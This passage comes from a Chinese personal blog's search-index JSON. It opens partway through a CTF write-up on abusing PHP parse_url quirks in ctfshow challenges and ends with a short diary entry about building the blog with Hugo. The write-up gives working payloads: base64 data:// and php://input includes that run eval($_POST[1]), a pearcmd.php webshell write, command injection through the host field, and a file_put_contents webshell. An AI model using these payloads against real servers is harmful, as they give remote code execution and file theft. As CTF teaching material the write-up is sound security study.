parse_url(\u0026#34;http://data:://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==\u0026#34;); print_r($data); echo $data[\u0026#39;host\u0026#39;].$data[\u0026#39;path\u0026#39;]; ?\u0026gt; 输出结果： Array ( [scheme] =\u0026gt; http [host] =\u0026gt; data: [path] =\u0026gt; //text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== ) data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== \u0026lt;?php $data = parse_url(\u0026#34;http:data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==\u0026#34;); print_r($data); echo $data[\u0026#39;host\u0026#39;].$data[\u0026#39;path\u0026#39;]; ?\u0026gt; 输出结果： Array ( [scheme] =\u0026gt; http [path] =\u0026gt; data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== ) PHP Notice: Undefined index: host in D:\\CODE_python\\1.php on line 7 Notice: Undefined index: host in D:\\CODE_python\\1.php on line 7 data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== payload 1 2 3 4 5 6 7 8 9 ?u=http://data:://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== // \u0026lt;?php phpinfo(); ?\u0026gt; ?u=http://data:://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg== // \u0026lt;?php eval($_POST[1]); ?\u0026gt; POST: 1=system(\u0026#34;ls /\u0026#34;); POST: 1=system(\u0026#34;tac /_f1ag_1s_h3re.txt\u0026#34;); ?u=http:data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== 1 2 ?u=http://php:://input POST: \u0026lt;?php phpinfo(); ?\u0026gt; 1 /?u=ctfshow://data:://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL19mKicpOz8%2b 第三关 1 2 3 $data = parse_url($_GET[\u0026#39;u\u0026#39;]); include $data[\u0026#39;scheme\u0026#39;].$data[\u0026#39;path\u0026#39;]; 分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 scheme 和 path 配合，scheme 是 http http:// 是可以省略掉两个斜杠的 http://和http:是一样的结果，因为这个函数只需要识别冒号前面的为http 而且在冒号后面的如果接的不是//，后面的内容就会被识别为 path 而不是 host \u0026lt;?php $data = parse_url(\u0026#34;data:://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\u0026#34;); print_r($data); echo $data[\u0026#39;scheme\u0026#39;].$data[\u0026#39;path\u0026#39;]; ?\u0026gt; 输出结果： Array ( [scheme] =\u0026gt; data [path] =\u0026gt; ://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg== ) data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg== \u0026lt;?php $data = parse_url(\u0026#34;data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\u0026#34;); print_r($data); echo $data[\u0026#39;scheme\u0026#39;].$data[\u0026#39;path\u0026#39;]; ?\u0026gt; 输出结果： Array ( [scheme] =\u0026gt; data [host] =\u0026gt; text [path] =\u0026gt; /plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg== ) data/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg== payload 1 2 3 4 ?u=data:://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg== // \u0026lt;?php eval($_POST[1]); ?\u0026gt; POST: 1=system(\u0026#34;ls /\u0026#34;); POST: 1=system(\u0026#34;tac /_f1a_g_1s_h3re\u0026#34;); 1 2 ?u=php:://input POST: \u0026lt;?php phpinfo(); ?\u0026gt; 1 2 3 ?u=..://aaa/../../../../../../usr/local/lib/php/pearcmd.php\u0026amp;aaaa+config-create+/var/www/html/\u0026lt;?=`$_POST[1]`;?\u0026gt;+1.php 1=ls / 第四关 1 2 3 $data = parse_url($_GET[\u0026#39;u\u0026#39;]); system($data[\u0026#39;host\u0026#39;]); 知识点 1 2 ${PWD} /var/www/html ${PWD::1} / payload 1 2 3 host会取最后一个冒号作为port的起始标志，最后需要加冒号，防止构造的paylaod被在中间截断 ?u=http://ls ${PWD::1}: ?u=http://tac ${PWD::1}1_f1ag_1s_h3re: 1 2 3 4 5 6 7 8 ?u=ctfshow://`echo \u0026#39;Y2F0IC8xX2YxYWdfMXNfaDNyZQ==\u0026#39;|base64 -d`/h1xa Array ( [scheme] =\u0026gt; ctfshow [host] =\u0026gt; `echo \u0026#39;Y2F0IC8xX2YxYWdfMXNfaDNyZQ==\u0026#39;|base64 -d` [path] =\u0026gt; /h1xa ) 1 2 3 4 5 6 ?u=http://pwd;cd ..;pwd 结果：/var/www/html(第一个pwd) /var/www(第二个pwd) 使用cd切换目录之后，两次的pwd执行结果不同，代表切换目录成功 ?u=http://cd ..;cd ..;cd ..;cat 1_f1ag_1s_h3re 一直切换到根目录，然后找flag 第五关 1 2 3 extract(parse_url($_GET[\u0026#39;u\u0026#39;])); include $$$$$$host; 题目分析 1 变量覆盖 知识点 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 extract()：从数组中将变量导入到当前的符号表 parse_url()：返回的就是数组，相当于把数组的key变成了当前文件内的变量，数组的value就是变量的值 print_r(parse_url(\u0026#39;http://username:password@127.0.0.1:8080/index.php?id=1#abc\u0026#39;)); 输出为: Array ( [scheme] =\u0026gt; http [host] =\u0026gt; 127.0.0.1 [port] =\u0026gt; 8080 [user] =\u0026gt; username [pass] =\u0026gt; password [path] =\u0026gt; /index.php [query] =\u0026gt; id=1 [fragment] =\u0026gt; abc ) payload 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $host = scheme $$host = $scheme = user $$$host = $user = pass $$$$host = $pass = query $$$$$host = $query = fragment $$$$$$host = $fragment 这里变量覆盖，不用port和path，大概因为port为端口，是数字，path前面会自带/ ?u=user://pass:query@scheme:8080/aaa?fragment%23data://text/plain,\u0026lt;?php system(\u0026#34;ls /\u0026#34;);?\u0026gt; ?u=user://pass:query@scheme:8080/aaa?fragment%23data://text/plain,\u0026lt;?php system(\u0026#34;tac /_f1ag_1s_h3ree\u0026#34;);?\u0026gt; 注意：这里#需要进行%23编码，如果不写%23直接写#，#后的内容会被浏览器直接过滤掉。 ?u=user://pass:query@scheme/?fragment%23data://,\u0026lt;?php system(\u0026#39;cat /_f1ag_1s_h3ree\u0026#39;);?\u0026gt; ?u=user://pass:query@scheme:3389/aaa?fragment%23php://input 第六关 1 2 3 $data = parse_url($_GET[\u0026#39;u\u0026#39;]); file_put_contents($data[\u0026#39;path\u0026#39;], $data[\u0026#39;host\u0026#39;]); 题目分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 path前面自带一个/, 不能访问根目录，需要写绝对路径到当前目录 不能有？，因为会被读取为query的值 长标签的后面的结束标签 \u0026lt;/script\u0026gt; 有一个斜杠，后面的会被当成 path 处理，在script中可以没有 \u0026lt;/script \u0026gt; 结束符号，只不过往后的所有代码都会被识别为script file_put_contents()函数将host的值作为内容写入path的值为文件名的文件中。 \u0026lt;?php $data = parse_url(\u0026#34;http://\u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval($_POST[1]);/var/www/html/1.php\u0026#34;); print_r($data); echo $data[\u0026#39;host\u0026#39;]; ?\u0026gt; 输出结果： Array ( [scheme] =\u0026gt; http [host] =\u0026gt; \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval(); [path] =\u0026gt; /var/www/html/1.php ) \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval(); \u0026lt;?php $data = parse_url(\u0026#34;http://\u0026lt;?php eval($_POST[1]); ?\u0026gt;/var/www/html/1.php\u0026#34;); print_r($data); echo $data[\u0026#39;host\u0026#39;]; ?\u0026gt; 输出结果： Array ( [scheme] =\u0026gt; http [host] =\u0026gt; \u0026lt; [query] =\u0026gt; php eval(); ?\u0026gt;/var/www/html/1.php ) \u0026lt; \u0026lt;?php $data = parse_url(\u0026#39;http://\u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt; eval($_POST[1]); \u0026lt;/script\u0026gt;/var/www/html/1.php\u0026#39;); print_r($data); echo $data[\u0026#39;host\u0026#39;]; ?\u0026gt; 输出结果： Array ( [scheme] =\u0026gt; http [host] =\u0026gt; \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt; eval($_POST[1]); \u0026lt; [path] =\u0026gt; /script\u0026gt;/var/www/html/1.php ) \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt; eval($_POST[1]); \u0026lt; 知识点 php常用标签 1 2 3 1.\u0026lt;?php ?\u0026gt; 2.\u0026lt;? ?\u0026gt; 3.\u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; payload 1 2 3 4 5 6 /?u=http://\u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;eval($_POST[1]);/var/www/html/1.php http://5708d4ed-1067-4a90-9eb1-138bc4931d7e.challenge.ctf.show/1.php 1=system(\u0026#34;ls /\u0026#34;); 1=system(\u0026#34;tac /_f1a_g_1s_h3re\u0026#34;); ","date":"2023-05-17T23:16:11+08:00","permalink":"https://relish1one.github.io/p/parse_url/","title":"PARSE_URL"},{"content":"碎碎念一下，记录自己博客搭建过程 ​\t这里必须承认，理论与实践的完美结合才是王炸，而我个人的动手能力确实不尽如人意。然而，当看到自己的博客逐渐有了雏形，最终成功地部署在GitHub上时，内心还是很激动。\n​\t从寒假开始，搭建一个属于自己的博客的构想在我心中萌芽，但是发育过程还是历经了几番波折，先是选择了Hexo框架，没有成功，不久后又转而投入Hugo框架。在这个过程中，参考了许多文章，然而，实话实说，由于我自身的知识储备相对贫乏，动手能力也实属菜鸟水平，一直没能搭建成功，渐渐搁置了。\n​\t开学以后，开始着手学习Web，已经接触大概有了近三个月的时间，提升了一点解决问题的能力。最近这几天，可能是学习web学的有点自我怀疑，想找个其他事情转移下，又开始了新一次博客搭建，哈哈哈~就是一个很平凡的晚上，终于达成了搭建博客的目标，当可以用域名访问的那一刻，还是欣喜万分，虽然这确实是一个不需要啥技术含量的事情。\n​\t以下是最后一次搭建成功时所参考的文章，贴一下链接：\n​\t首先，推荐一篇题为《如何用 GitHub Pages + Hugo 搭建个人博客》的文章，其中详细介绍了整个搭建过程：如何用 GitHub Pages + Hugo 搭建个人博客\n​\t其次，使用的博客主题是JuiceBar，详情可参考以下链接：主题JuiceBar\n​\t另外，遇到了一个关于权限的问题，当时我无法使用git@github.com进行远程仓库操作，但在这篇文章中找到了解决办法：解决git@github.com: Permission denied (publickey). Could not read from remote repository\n​\t最后，还想推荐一篇名为《Hugo搭建博客（一）— 基本设置》的文章，其中详细介绍了Hugo的基本配置和设置：Hugo搭建博客（一）— 基本设置\n​\t在这个漫长而曲折的过程中，漫长是指从出具想法到成功实现的时间吧，从寒假到五月份，也确实蛮久了，曲折，确实是来来回回尝试了好几次了（这里没有说利用博客搭建很难的问题，还是自己菜的原因）。尽管这个过程的困惑和挫折不可避免，但多尝试，多动手，总会实现自己的目标呀。\n​\t这个过程，自己还是感想蛮多，但是这里言简意赅。\n​\t稳住心态，注重实践，少年的征途是远方。\n","date":"2023-05-17T23:14:13+08:00","permalink":"https://relish1one.github.io/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","title":"博客搭建"}]